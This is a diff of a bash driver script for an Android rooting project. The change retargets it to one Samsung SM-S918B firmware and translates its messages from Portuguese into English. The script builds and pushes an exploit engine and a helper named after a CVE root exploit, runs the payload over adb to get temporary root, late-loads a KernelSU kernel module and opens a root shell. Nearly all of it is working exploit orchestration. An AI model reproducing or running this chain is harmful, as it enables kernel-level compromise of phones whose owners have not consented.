@@ -13,8 +13,8 @@ REMOTE_MM_FACTORY=/data/local/tmp/mm-exec-factory
 REMOTE_ASSETS=/data/local/tmp/simple-root
 
 usage() {
-  printf 'Uso: %s [serial-adb]\n' "${0##*/}"
-  printf 'Executa o payload e carrega KernelSU sem temporizadores.\n'
+  printf 'Usage: %s [adb-serial]\n' "${0##*/}"
+  printf 'Runs only S918BXXUAZZI8, the latest One UI 9 Beta 2 firmware, and loads KernelSU Next.\n'
 }
 
 if [[ "${1:-}" == -h || "${1:-}" == --help ]]; then
@@ -27,85 +27,22 @@ if [[ $# -gt 1 ]]; then
 fi
 
 PROJECT_DIR="$(cd -- "$SCRIPT_DIR/.." && pwd)"
-TARGET_DIR="$PROJECT_DIR/targets/afzh3"
-KSUD_DIR="$TARGET_DIR/kernelsu-next/out/kernelsu-next-afzh3-v3.4.0"
-KSUD_SOURCE="$KSUD_DIR/ksud-next-v3.4.0"
-KSUD_MODULE="$KSUD_DIR/android13-5.15_kernelsu.ko"
-KSUD_ASSET=ksud-selected
-KSUD_MODULE_ASSET=android13-5.15_kernelsu.ko
-if [[ ! -s "$KSUD_SOURCE" || ! -s "$KSUD_MODULE" || ! -s "$KSUD_DIR/SHA256SUMS" ]]; then
-  printf 'KernelSU Next AFZH3 com patch Samsung ausente: %s\n' "$KSUD_SOURCE" >&2
-  printf 'O modulo generico v3.4.0 causou kernel panic neste aparelho.\n' >&2
-  exit 1
-fi
-if ! (cd -- "$KSUD_DIR" && sha256sum --status -c SHA256SUMS); then
-  printf 'Hashes do modulo Samsung e ksud nao conferem.\n' >&2
-  exit 1
-fi
-if ! rg -a -q 'Samsung KDP task-scoped credential' "$KSUD_MODULE"; then
-  printf 'Modulo sem suporte Samsung KDP: %s\n' "$KSUD_MODULE" >&2
-  exit 1
-fi
-if [[ "$(modinfo -F vermagic "$KSUD_MODULE")" != '5.15.189-android13-8-33413713-abS918BXXSAFZH3 '* ]]; then
-  printf 'Modulo nao corresponde ao kernel AFZH3: %s\n' "$KSUD_MODULE" >&2
-  exit 1
-fi
-mkdir -p "$ASSET_DIR"
-install -m 755 "$KSUD_SOURCE" "$ASSET_DIR/$KSUD_ASSET"
-install -m 644 "$KSUD_MODULE" "$ASSET_DIR/$KSUD_MODULE_ASSET"
-
-LAUNCHER_DIR="$PROJECT_DIR/stability-launcher"
-ENGINE_DIR="$TARGET_DIR/brazilian-open-payload-engine"
-HELPER_DIR="$TARGET_DIR/helper"
-HELPER_BINARY="$HELPER_DIR/build/cve-2026-43499-root"
-NDK_DIR="${ANDROID_NDK_HOME:-${ANDROID_NDK_ROOT:-$HOME/Android/Sdk/ndk/28.2.13676358}}"
-LAUNCHER_CC="$NDK_DIR/toolchains/llvm/prebuilt/linux-x86_64/bin/aarch64-linux-android35-clang"
-if [[ ! -x "$LAUNCHER_CC" ]]; then
-  NDK_DIR="$HOME/Android/Sdk/ndk/28.2.13676358"
-  LAUNCHER_CC="$NDK_DIR/toolchains/llvm/prebuilt/linux-x86_64/bin/aarch64-linux-android35-clang"
-fi
-if [[ ! -x "$LAUNCHER_CC" ]]; then
-  printf 'Compilador Android ausente: %s\nDefina ANDROID_NDK_HOME para o NDK instalado.\n' "$LAUNCHER_CC" >&2
-  exit 1
-fi
-printf '[*] Compilando stability-launcher para Android ARM64/API 35\n'
-mkdir -p "$LAUNCHER_DIR/build" "$ASSET_DIR"
-"$LAUNCHER_CC" -O2 -Wall -Wextra -Werror -fPIE \
-  -fstack-protector-strong -D_FORTIFY_SOURCE=2 \
-  -include "$PROJECT_DIR/native/compact_log.h" \
-  "$LAUNCHER_DIR/stability-launcher.c" \
-  "$PROJECT_DIR/native/compact_log.c" \
-  -pie -Wl,-z,relro,-z,now -o "$LAUNCHER_DIR/build/stability-launcher"
-install -m 755 "$LAUNCHER_DIR/build/stability-launcher" "$ASSET_DIR/stability-launcher"
-
-if [[ ! -f "$ENGINE_DIR/Makefile" ]]; then
-  printf 'Engine AFZH3 ausente: %s\n' "$ENGINE_DIR" >&2
-  exit 1
-fi
-printf '[*] Compilando engine AFZH3\n'
-make -C "$ENGINE_DIR" -B -j2 so
-install -m 755 "$ENGINE_DIR/build/payload.so" "$ASSET_DIR/payload.so"
-install -m 755 "$ENGINE_DIR/build/mm-exec-factory" "$ASSET_DIR/mm-exec-factory"
-
-# Build the open-source helper used for both UMH and KernelSU late-load.
-printf '[*] Compilando helper AFZH3 de targets/afzh3/helper/su_daemon.c\n'
-make -B -C "$HELPER_DIR" "ANDROID_NDK_HOME=$NDK_DIR"
-install -m 755 "$HELPER_BINARY" "$ASSET_DIR/ksu-helper"
-
-assets=(ksu-helper payload.so mm-exec-factory "$KSUD_ASSET" "$KSUD_MODULE_ASSET" stability-launcher)
-for asset in "${assets[@]}"; do
-  [[ -s "$ASSET_DIR/$asset" ]] || {
-    printf 'Asset ausente ou vazio: %s\n' "$ASSET_DIR/$asset" >&2
-    exit 1
-  }
-done
+TARGET_DIR="$PROJECT_DIR/targets/zzi8-WIP"
+TARGET_BUILD=S918BXXUAZZI8
+TARGET_DESCRIPTION='latest One UI 9 Beta 2 firmware'
+TARGET_MODEL=SM-S918B
+TARGET_DEVICE=dm3q
+TARGET_BUILD_DISPLAY=CP2A.260605.016.S918BXXUAZZI8
+TARGET_FINGERPRINT=samsung/dm3qxxx/dm3q:17/CP2A.260605.016/S918BXXUAZZI8:user/release-keys
+TARGET_KERNEL_RELEASE=5.15.197-android13-8-34343818-abS918BXXUAZZI8
+TARGET_KERNEL_VERSION='#1 SMP PREEMPT Mon Sep 14 06:56:00 UTC 2026'
 
 if [[ $# -eq 1 ]]; then
   serial="$1"
 else
   mapfile -t devices < <("$ADB" devices | awk 'NR > 1 && $2 == "device" { print $1 }')
   if [[ ${#devices[@]} -ne 1 ]]; then
-    printf 'Esperava exatamente um dispositivo ADB autorizado; encontrei %d.\n' "${#devices[@]}" >&2
+    printf 'Expected exactly one authorized ADB device; found %d.\n' "${#devices[@]}" >&2
     "$ADB" devices -l >&2
     exit 1
   fi
@@ -114,11 +51,106 @@ fi
 
 adb_cmd=("$ADB" -s "$serial")
 if ! "${adb_cmd[@]}" get-state 2>/dev/null | grep -qx device; then
-  printf 'Dispositivo ADB indisponível ou não autorizado: %s\n' "$serial" >&2
+  printf 'ADB device is unavailable or unauthorized: %s\n' "$serial" >&2
   exit 1
 fi
 
-printf '[*] Copiando assets selecionados para %s\n' "$REMOTE_ASSETS"
+device_model="$("${adb_cmd[@]}" shell getprop ro.product.model | tr -d '\r')"
+device_name="$("${adb_cmd[@]}" shell getprop ro.product.device | tr -d '\r')"
+device_build="$("${adb_cmd[@]}" shell getprop ro.build.display.id | tr -d '\r')"
+device_fingerprint="$("${adb_cmd[@]}" shell getprop ro.build.fingerprint | tr -d '\r')"
+device_kernel_release="$("${adb_cmd[@]}" shell uname -r | tr -d '\r')"
+device_kernel_version="$("${adb_cmd[@]}" shell uname -v | tr -d '\r')"
+if [[ "$device_model" != "$TARGET_MODEL" ||
+      "$device_name" != "$TARGET_DEVICE" ||
+      "$device_build" != "$TARGET_BUILD_DISPLAY" ||
+      "$device_fingerprint" != "$TARGET_FINGERPRINT" ||
+      "$device_kernel_release" != "$TARGET_KERNEL_RELEASE" ||
+      "$device_kernel_version" != "$TARGET_KERNEL_VERSION" ]]; then
+  printf 'Incompatible firmware. simple-root supports only %s, the %s.\n' \
+    "$TARGET_BUILD" "$TARGET_DESCRIPTION" >&2
+  printf 'Expected: %s | %s | %s | %s\n' \
+    "$TARGET_MODEL" "$TARGET_DEVICE" "$TARGET_BUILD_DISPLAY" "$TARGET_KERNEL_RELEASE" >&2
+  printf 'Detected: %s | %s | %s | %s\n' \
+    "$device_model" "$device_name" "$device_build" "$device_kernel_release" >&2
+  exit 1
+fi
+printf '[+] Target confirmed: %s, the %s (%s)\n' \
+  "$TARGET_BUILD" "$TARGET_DESCRIPTION" "$serial"
+
+KSUD_DIR="$TARGET_DIR/kernelsu-next/out/kernelsu-next-zzi8-v3.4.0"
+KSUD_SOURCE="$KSUD_DIR/ksud-next-v3.4.0"
+KSUD_MODULE="$KSUD_DIR/android13-5.15_kernelsu.ko"
+KSUD_ASSET=ksud-selected
+KSUD_MODULE_ASSET=android13-5.15_kernelsu.ko
+if [[ ! -s "$KSUD_SOURCE" || ! -s "$KSUD_MODULE" || ! -s "$KSUD_DIR/SHA256SUMS" ]]; then
+  printf 'Samsung-patched KernelSU Next for ZZI8, the %s, is missing: %s\n' \
+    "$TARGET_DESCRIPTION" "$KSUD_SOURCE" >&2
+  printf 'The generic v3.4.0 module caused a kernel panic on this device.\n' >&2
+  exit 1
+fi
+if ! (cd -- "$KSUD_DIR" && sha256sum --status -c SHA256SUMS); then
+  printf 'Samsung module and ksud hashes do not match.\n' >&2
+  exit 1
+fi
+if ! rg -a -q 'Samsung KDP task-scoped credential' "$KSUD_MODULE"; then
+  printf 'Module does not include Samsung KDP support: %s\n' "$KSUD_MODULE" >&2
+  exit 1
+fi
+if [[ "$(modinfo -F vermagic "$KSUD_MODULE")" != "$TARGET_KERNEL_RELEASE "* ]]; then
+  printf 'Module does not match the ZZI8 kernel for the %s: %s\n' \
+    "$TARGET_DESCRIPTION" "$KSUD_MODULE" >&2
+  exit 1
+fi
+mkdir -p "$ASSET_DIR"
+install -m 755 "$KSUD_SOURCE" "$ASSET_DIR/$KSUD_ASSET"
+install -m 644 "$KSUD_MODULE" "$ASSET_DIR/$KSUD_MODULE_ASSET"
+
+ENGINE_DIR="$TARGET_DIR/brazilian-open-payload-engine"
+HELPER_DIR="$TARGET_DIR/helper"
+HELPER_BINARY="$HELPER_DIR/build/cve-2026-43499-root"
+LAUNCHER_BINARY="$ENGINE_DIR/build/stability-launcher-zzi8"
+NDK_DIR="${ANDROID_NDK_HOME:-${ANDROID_NDK_ROOT:-$HOME/Android/Sdk/ndk/28.2.13676358}}"
+TARGET_CC="$NDK_DIR/toolchains/llvm/prebuilt/linux-x86_64/bin/aarch64-linux-android35-clang"
+if [[ ! -x "$TARGET_CC" ]]; then
+  NDK_DIR="$HOME/Android/Sdk/ndk/28.2.13676358"
+  TARGET_CC="$NDK_DIR/toolchains/llvm/prebuilt/linux-x86_64/bin/aarch64-linux-android35-clang"
+fi
+if [[ ! -x "$TARGET_CC" ]]; then
+  printf 'Android compiler is missing: %s\nSet ANDROID_NDK_HOME to the installed NDK.\n' "$TARGET_CC" >&2
+  exit 1
+fi
+if [[ ! -f "$ENGINE_DIR/Makefile" ]]; then
+  printf 'ZZI8 engine for the %s is missing: %s\n' "$TARGET_DESCRIPTION" "$ENGINE_DIR" >&2
+  exit 1
+fi
+printf '[*] Verifying the ZZI8 ELF/BTF contract for the %s\n' "$TARGET_DESCRIPTION"
+"$PROJECT_DIR/tools/bope-verify-target" \
+  --header "$ENGINE_DIR/src/target.h" \
+  --elf "$TARGET_DIR/firmware/vmlinux_ZZI8.elf" \
+  --btf "$TARGET_DIR/firmware/vmlinux_ZZI8.btf"
+printf '[*] Building BOPE, the mm factory, and the ZZI8 Stability Launcher for the %s\n' \
+  "$TARGET_DESCRIPTION"
+make -C "$ENGINE_DIR" -B -j2 "ANDROID_NDK_HOME=$NDK_DIR" so
+install -m 755 "$ENGINE_DIR/build/payload.so" "$ASSET_DIR/payload.so"
+install -m 755 "$ENGINE_DIR/build/mm-exec-factory" "$ASSET_DIR/mm-exec-factory"
+install -m 755 "$LAUNCHER_BINARY" "$ASSET_DIR/stability-launcher"
+
+# Build the open-source helper used for both UMH and KernelSU late-load.
+printf '[*] Building the ZZI8 helper for the %s from targets/zzi8-WIP/helper/su_daemon.c\n' \
+  "$TARGET_DESCRIPTION"
+make -B -C "$HELPER_DIR" "ANDROID_NDK_HOME=$NDK_DIR"
+install -m 755 "$HELPER_BINARY" "$ASSET_DIR/ksu-helper"
+
+assets=(ksu-helper payload.so mm-exec-factory "$KSUD_ASSET" "$KSUD_MODULE_ASSET" stability-launcher)
+for asset in "${assets[@]}"; do
+  [[ -s "$ASSET_DIR/$asset" ]] || {
+    printf 'Asset is missing or empty: %s\n' "$ASSET_DIR/$asset" >&2
+    exit 1
+  }
+done
+
+printf '[*] Copying the selected assets to %s\n' "$REMOTE_ASSETS"
 "${adb_cmd[@]}" shell mkdir -p "$REMOTE_ASSETS"
 for asset in "${assets[@]}"; do
   "${adb_cmd[@]}" push "$ASSET_DIR/$asset" "$REMOTE_ASSETS/$asset"
@@ -126,7 +158,7 @@ done
 
 if root_identity="$("${adb_cmd[@]}" shell "/system/bin/su -c 'id'" 2>/dev/null)" &&
    grep -q 'uid=0(root)' <<<"$root_identity"; then
-  printf '[+] Root já ativo: %s\n' "$root_identity"
+  printf '[+] Root is already active: %s\n' "$root_identity"
   exit 0
 fi
 
@@ -138,12 +170,12 @@ stage() {
   "${adb_cmd[@]}" shell chmod 755 "$target"
   magic="$("${adb_cmd[@]}" shell "head -c 4 '$target' | od -An -tx1 | tr -d ' \\n\\r'")"
   if [[ "$magic" != 7f454c46 ]]; then
-    printf 'ELF magic inválido em %s: %s\n' "$target" "$magic" >&2
+    printf 'Invalid ELF magic at %s: %s\n' "$target" "$magic" >&2
     exit 1
   fi
 }
 
-printf '[*] Preparando payload em %s\n' "$serial"
+printf '[*] Staging the payload on %s\n' "$serial"
 stage ksu-helper "$REMOTE_HELPER"
 stage payload.so "$REMOTE_PAYLOAD"
 stage mm-exec-factory "$REMOTE_MM_FACTORY"
@@ -153,12 +185,12 @@ stage stability-launcher "$REMOTE_LAUNCHER"
 env_exports=""
 if [[ -n "${SLIDE_P0_OFFSET:-}" ]]; then
   if [[ ! "$SLIDE_P0_OFFSET" =~ ^0x[0-9a-fA-F]+$ ]]; then
-    printf 'SLIDE_P0_OFFSET inválido; use formato hexadecimal 0x...\n' >&2
+    printf 'Invalid SLIDE_P0_OFFSET; use hexadecimal format 0x...\n' >&2
     exit 2
   fi
   offset_value=$((SLIDE_P0_OFFSET))
   if (( offset_value > 0x1f8000 || (offset_value & 0x7fff) != 0 )); then
-    printf 'SLIDE_P0_OFFSET fora dos limites/alinhamento aceitos pelo app.\n' >&2
+    printf 'SLIDE_P0_OFFSET is outside the range/alignment accepted by the app.\n' >&2
     exit 2
   fi
   env_exports+="export SLIDE_P0_OFFSET='$SLIDE_P0_OFFSET'
@@ -168,7 +200,7 @@ for var in FUTEX_WAIT_SEC KSNITCH_REPEAT KSNITCH_APPENDED PIPE_DETERMINISTIC RMG
   val="${!var:-}"
   [[ -z "$val" ]] && continue
   if [[ ! "$val" =~ ^[0-9]+$ ]]; then
-    printf '%s inválido; use inteiro.\n' "$var" >&2
+    printf 'Invalid %s; use an integer.\n' "$var" >&2
     exit 2
   fi
   env_exports+="export $var='$val'
@@ -176,32 +208,32 @@ for var in FUTEX_WAIT_SEC KSNITCH_REPEAT KSNITCH_APPENDED PIPE_DETERMINISTIC RMG
 done
 exploit_script="${env_exports}exec '$REMOTE_LAUNCHER' --payload '$REMOTE_PAYLOAD' --helper '$REMOTE_HELPER' --mm-factory '$REMOTE_MM_FACTORY' 2>&1"
 
-printf '[*] Executando payload\n'
+printf '[*] Running the payload\n'
 exploit_log="$(mktemp)"
 trap 'rm -f "$exploit_log"' EXIT
 if ! "${adb_cmd[@]}" shell "$exploit_script" 2>&1 | tee "$exploit_log"; then
-  printf 'Execução do payload falhou.\n' >&2
+  printf 'Payload execution failed.\n' >&2
   exit 1
 fi
 if ! grep -Eq 'temporary-root-ready|exploit completed.*done=1 root=1' "$exploit_log"; then
-  printf 'Payload não confirmou root temporário.\n' >&2
+  printf 'The payload did not confirm temporary root.\n' >&2
   exit 1
 fi
 
 stage "$KSUD_ASSET" "$REMOTE_KSUD"
 stage "$KSUD_ASSET" "$REMOTE_KSUD_STAGE"
-printf '[*] Carregando KernelSU\n'
+printf '[*] Loading KernelSU\n'
 if ! "${adb_cmd[@]}" shell "$REMOTE_HELPER" --late-load; then
-  printf 'KernelSU --late-load falhou.\n' >&2
+  printf 'KernelSU --late-load failed.\n' >&2
   exit 1
 fi
 selinux_enforce="$("${adb_cmd[@]}" shell 'cat /sys/fs/selinux/enforce' 2>/dev/null | tr -d '\r\n')"
 if [[ "$selinux_enforce" != 1 ]]; then
-  printf 'SELinux não retornou a enforcing após KernelSU: %s\n' "$selinux_enforce" >&2
+  printf 'SELinux did not return to enforcing after KernelSU: %s\n' "$selinux_enforce" >&2
   exit 1
 fi
 
-printf '[*] Aguardando su (até 30s)\n'
+printf '[*] Waiting for su (up to 30 seconds)\n'
 root_identity=
 root_command_ok=0
 root_deadline=$((SECONDS + 30))
@@ -219,11 +251,11 @@ while :; do
 done
 if ! grep -q 'uid=0(root)' <<<"$root_identity"; then
   if (( root_command_ok == 0 )); then
-    printf 'Comando su -c id falhou após 30s.\n' >&2
+    printf 'The su -c id command failed after 30 seconds.\n' >&2
   else
-    printf 'Shell su não confirmou uid=0(root) após 30s.\n' >&2
+    printf 'The su shell did not confirm uid=0(root) after 30 seconds.\n' >&2
   fi
   exit 1
 fi
-printf '[+] Root confirmado\n'
+printf '[+] Root confirmed\n'
 exec "${adb_cmd[@]}" shell su
